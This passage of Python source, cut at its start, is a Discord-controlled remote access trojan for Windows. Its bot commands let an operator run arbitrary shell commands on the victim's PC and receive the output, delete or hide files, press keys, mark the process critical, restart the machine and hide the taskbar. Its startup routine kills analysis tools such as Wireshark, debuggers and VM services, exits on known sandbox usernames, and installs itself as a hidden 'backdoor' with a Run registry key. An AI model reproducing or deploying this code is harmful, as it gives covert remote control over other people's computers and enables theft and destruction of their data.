        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[-1]
        done = (last_line.lower().startswith(process_name.lower()))
        if done == False:
            await ctx.send(f"Killed the **{proc}** task for **{os.getlogin()}**")
        elif done == True:
            await ctx.send(f"Error killing the **{proc}** task  for **{os.getlogin()}**")

@client.command()
async def delfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            if os.path.exists(filepath):
                if os.path.isdir(filepath):
                    shutil.rmtree(filepath)
                    await ctx.send(f"Deleted directory **{filepath}** from **{os.getlogin()}**")
                    return
                os.remove(filepath)
                await ctx.send(f"Deleted file **{filepath}** from **{os.getlogin()}**")
        except WindowsError as e:
            await ctx.send(f"System error trying to delete **{filepath}** from **{os.getlogin()}**")

@client.command()
async def setwp(ctx, *, usid):
    if usid == clientid:
        path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
        await ctx.message.attachments[0].save(path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
        await ctx.send(f"Changed wallpaper for **{os.getlogin()}**")

@client.command()
async def critproc(ctx, *, usid):
    if usid == clientid:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
            await ctx.send(f"Successfully set the task to a critical process for **{os.getlogin()}**.")
        else:
            await ctx.send(f"Insufficient permissions to critproc for **{os.getlogin()}**")

@client.command()
async def hidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib +h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f"**{filepath}** has been hidden for **{os.getlogin()}**")
        except:
            await ctx.send(f"Error hiding **{filepath}** for **{os.getlogin()}**")
            
@client.command()
async def unhidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib -h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f"**{filepath}** is now visible for **{os.getlogin()}**")
        except:
            await ctx.send(f"Error returning **{filepath}** to visible for **{os.getlogin()}**")

@client.command()
async def key_press(ctx, usid, *, keyname):
    if usid == clientid:
        try:
            pyautogui.press(keyname)
            await ctx.send(f"**{os.getlogin()}** has pressed the **{keyname}** key.")
        except: await ctx.send(f"**{keyname}** is not recognized as a key.")

@client.command()
async def screenflip(ctx, *, usid):
    if usid == clientid:
        try:
            screen = rs.get_primary_display()
            start_pos = screen.current_orientation
            pos = abs((start_pos - 1*90) % 360)
            screen.rotate_to(pos)
            await ctx.send(f"**{os.getlogin()}**'s screen has been flipped.")
        except: await ctx.send(f"**{os.getlogin()}**'s screen could not be flipped.")

@client.command()
async def hardware_list(ctx, *, usid):
    if usid == clientid:
        message = ""
        message += f"`CPU`: **{psutil.cpu_count()}** cores\n"
        message += f"`RAM`: **{psutil.virtual_memory().total / (1024.0 ** 3)}** GB\n"
        message += f"`Hard disk`: **{psutil.disk_usage('/').total / (1024.0 ** 3)}** GB\n"
        message += f"`Boot device`: {psutil.disk_partitions()[0].device}"
        await ctx.send(f"Hardware information for **{os.getlogin()}**: \n\n{message}")

@client.command()
async def chdisk(ctx, usid, *, disk):
    if usid == clientid:
        try:
            os.chdir(disk)
            await ctx.send(f"Disk changed to **{disk}** for **{os.getlogin()}**")
        except: await ctx.send(f"Error changing disk to **{disk}** for **{os.getlogin()}**")

@client.command()
async def restart(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"**{os.getlogin()}**'s PC has been shut down.")
        os.system("shutdown /r /t 1")

@client.command()
async def hidetaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 0)
            await ctx.send(f"**{os.getlogin()}**'s taskbar has been hidden.")
        except: await ctx.send(f"**{os.getlogin()}**'s taskbar could not be hidden.")

@client.command()
async def showtaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 9)
            await ctx.send(f"**{os.getlogin()}**'s taskbar has been returned.")
        except: await ctx.send(f"**{os.getlogin()}**'s taskbar couldn't be returned.")

@client.command()
async def shell(ctx, usid, *, command=""):
    if usid == clientid:
        if command != "":
            try:
                output = os.popen(command).read()
                if len(output) > 2000:
                    temp_file = os.path.join(os.getenv('TEMP'), 'output.txt')
                    with open(temp_file, 'w') as file:
                        file.write(output)
                    await ctx.send('Output is too long. Sending as a file.', file=discord.File(temp_file))
                    os.remove(temp_file)
                else:
                    if output != "":
                        await ctx.send(f'Shell output for **{os.getlogin()}**:\n```{output}```')
                    else:
                        await ctx.send(f'Output empty for **{os.getlogin()}**')
            except Exception as e:
                await ctx.send(f'An error occurred: {str(e)}')
        else:
            await ctx.send(f"Please input a shell command for **{os.getlogin()}**")

@client.command()
async def tts(ctx, usid, *, text=""):
    if usid == clientid:
        if text != "":
            try:
                await ctx.send(f"Started saying **{text}** on **{os.getlogin()}**'s PC.")
                tts = gTTS(text=text, lang='en')
                tts.save('tts.mp3')
                playsound.playsound('tts.mp3', True)
                os.remove('tts.mp3')
                await ctx.send(f"Finished saying **{text}** on **{os.getlogin()}**'s PC.")
            except: pass
        elif text == "":
            await ctx.send(f"Please input something to say on **{os.getlogin()}**'s PC.")


def mainfunc():
    bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    bltask = ('vm3dservice', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')

    if hide_after_exec != False:
        p = os.popen('attrib +h "' + sys.executable + '"')
        p.close()

    if antivm != False:
        result = subprocess.getoutput("tasklist")
        numb = len(result)
        if numb > 0:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\olist.txt"):
                os.system(r"del %temp%\olist.txt /f")
            f1 = open(temp + r"\olist.txt", 'a')
            f1.write(result)
            f1.close()
            final = ""
            with open(f"{os.getenv('TEMP')}\olist.txt") as A:
                final = A.read().lower()
            for task in bltask:
                if task in final:
                    try:
                        kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
                        os.system(kilproc)
                    except: sys.exit(0)

        os.remove(f"{temp}\olist.txt")

        if f"{os.getlogin()}".lower() in bluser:
            sys.exit(0)

    if autostart != False:
        if sys.argv[0].endswith("exe"):
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                command = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v visuals /t REG_SZ /d "' + backdoor_location + '" /f'
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "visuals", 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                subprocess.call(command, shell=True)
                p = os.popen('attrib +h "' + backdoor_location + '"')
                p.close()
            if not sys.argv[0].endswith(process_name):
                os.startfile(backdoor_location)
                os._exit(0)
    
    

if __name__ == '__main__':
    mainfunc()

client.run(token)